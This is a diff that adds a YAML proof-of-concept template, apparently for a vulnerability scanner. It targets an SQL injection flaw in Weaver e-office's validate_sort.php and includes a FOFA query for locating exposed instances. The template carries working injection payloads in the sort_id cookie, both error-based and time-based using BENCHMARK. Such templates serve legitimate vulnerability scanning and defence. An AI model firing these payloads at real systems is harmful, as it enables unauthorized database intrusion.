@@ -1,0 +1,24 @@
+id: poc-yaml-weaver-e-office-validate-sort-sqli
+info:
+  name: 泛微OA e-office validate_sort SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+  fofa: app="泛微-EOffice"
+variables:
+  t1: random_int(3,7)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /general/system/interface/loginedit/word_update.php
+  headers:
+    Cookie: sort_id=1'
+  expression: status_code == 200 && contains(body,"supplied argument is not a valid
+    MySQL result resource in")
+- method: GET
+  path: /general/officeitem/sort/validate_sort.php
+  headers:
+    Cookie: sort_id=1 AND 4225=BENCHMARK({{.t1}}000000,MD5(0x4567684e))
+  expression: status_code == 200 && body == "" && duration > t1 && duration < t2
+transport: http
